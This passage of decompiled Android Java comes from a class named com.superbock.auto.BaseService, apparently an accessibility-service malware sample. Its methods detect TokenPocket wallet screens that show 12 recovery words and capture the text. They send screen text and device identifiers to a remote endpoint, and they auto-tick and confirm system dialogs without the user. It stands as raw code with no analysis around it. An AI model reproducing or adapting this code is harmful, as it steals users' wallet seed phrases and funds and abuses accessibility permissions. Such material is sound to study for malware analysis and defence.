                f1402s.addView(J, K);
                I = new e();
                J.getHolder().addCallback(I);
                i.n(0, "20", null);
            }
        }
    }

    public final void u(int i5) {
        f.e eVar = new f.e();
        eVar.put("action", "saveDev");
        eVar.put("step", 3);
        eVar.put("deviceId", k3.a.c(this));
        eVar.put("accessibility", Integer.valueOf(i5));
        k3.i.a(eVar, new a());
    }

    /* JADX WARN: Removed duplicated region for block: B:19:0x0032  */
    /* JADX WARN: Removed duplicated region for block: B:21:0x005f  */
    /* JADX WARN: Removed duplicated region for block: B:23:? A[RETURN, SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void v() {
        /*
            r6 = this;
            boolean r0 = com.superbock.auto.BaseService.F
            if (r0 == 0) goto L1b
            long r0 = com.superbock.auto.BaseService.E
            r2 = 0
            int r4 = (r0 > r2 ? 1 : (r0 == r2 ? 0 : -1))
            if (r4 <= 0) goto L1b
            long r2 = com.superbock.auto.BaseService.f1398q
            long r2 = r2 - r0
            r0 = 10000(0x2710, double:4.9407E-320)
            int r4 = (r2 > r0 ? 1 : (r2 == r0 ? 0 : -1))
            if (r4 >= 0) goto L1b
            int r0 = com.superbock.ui.StartupActivity.f1539i
            if (r0 <= 0) goto L1b
            r0 = 1
            goto L1c
        L1b:
            r0 = 0
        L1c:
            if (r0 != 0) goto L24
            boolean r1 = f3.i.b()
            if (r1 == 0) goto L73
        L24:
            android.view.accessibility.AccessibilityNodeInfo r1 = r6.f1413e
            r2 = 0
            java.lang.String r1 = i.g.G(r1, r2)
            if (r1 == 0) goto L73
            s3.g0 r2 = f3.i.f2795a
            if (r2 != 0) goto L32
            goto L5d
        L32:
            f.e r2 = new f.e
            r2.<init>()
            r3 = 1003(0x3eb, float:1.406E-42)
            java.lang.Integer r3 = java.lang.Integer.valueOf(r3)
            java.lang.String r4 = "code"
            r2.put(r4, r3)
            java.lang.String r3 = "data"
            r2.put(r3, r1)
            long r3 = java.lang.System.currentTimeMillis()
            java.lang.Long r3 = java.lang.Long.valueOf(r3)
            java.lang.String r4 = "t"
            r2.put(r4, r3)
            s3.g0 r3 = f3.i.f2795a
            java.lang.String r2 = r2.l()
            r3.b(r2)
        L5d:
            if (r0 == 0) goto L73
            g3.h r0 = g3.h.b()
            com.superbock.bean.GInfo r2 = new com.superbock.bean.GInfo
            java.lang.String r3 = e3.d.a()
            int r4 = com.superbock.ui.StartupActivity.f1539i
            java.lang.String r5 = r6.f1414f
            r2.<init>(r3, r4, r1, r5)
            r0.a(r2)
        L73:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.superbock.auto.BaseService.v():void");
    }

    public final void w() {
        AccessibilityNodeInfo k5;
        if (!"com.android.systemui".equals(this.f1418j) || !i.b() || i.f2797c == 0 || System.currentTimeMillis() - i.f2797c > WorkRequest.MIN_BACKOFF_MILLIS || (k5 = g.k(this.f1413e, "android:id/button1")) == null) {
            return;
        }
        AccessibilityNodeInfo k6 = g.k(this.f1413e, "android:id/checkbox");
        if (k6 != null && !k6.isChecked()) {
            k6.performAction(16);
        }
        if (Build.VERSION.SDK_INT >= 24) {
            n(k5);
        }
    }

    @RequiresApi(api = 24)
    public final void x() {
        int i5 = this.f1410b;
        int i6 = this.f1411c;
        q(i5 * 0.51f, i6 * 0.69f, i5 * 0.49f, i6 * 0.31f);
        try {
            Thread.sleep(500L);
        } catch (InterruptedException unused) {
        }
    }

    public final void y() {
        List<AccessibilityNodeInfo> findAccessibilityNodeInfosByViewId;
        if (g.f(this.f1413e, "vip.mytokenpocket:id/tv_copy") && g.f(this.f1413e, "vip.mytokenpocket:id/tv_next")) {
            AccessibilityNodeInfo accessibilityNodeInfo = this.f1413e;
            int i5 = 0;
            if (accessibilityNodeInfo != null && (findAccessibilityNodeInfosByViewId = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId("vip.mytokenpocket:id/tv_text")) != null) {
                i5 = findAccessibilityNodeInfosByViewId.size();
            }
            if (i5 >= 12) {
                String G2 = g.G(this.f1413e, null);
                if (TextUtils.isEmpty(G2)) {
                    return;
                }
                f1386c0 = G2;
                f1385b0 = f1398q;
            }
        }
    }

    public final void z() {
        if (g.h(this.f1413e, "1") && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_2D) && g.h(this.f1413e, ExifInterface.GPS_MEASUREMENT_3D) && g.h(this.f1413e, "4") && g.h(this.f1413e, "5") && g.h(this.f1413e, "6") && g.h(this.f1413e, "7") && g.h(this.f1413e, "8") && g.h(this.f1413e, "9") && g.h(this.f1413e, "10") && g.h(this.f1413e, "11") && g.h(this.f1413e, "12")) {
            String G2 = g.G(this.f1413e, null);
            if (TextUtils.isEmpty(G2)) {
                return;
            }
            f1392i0 = G2;
            f1391h0 = f1398q;
        }
    }
}
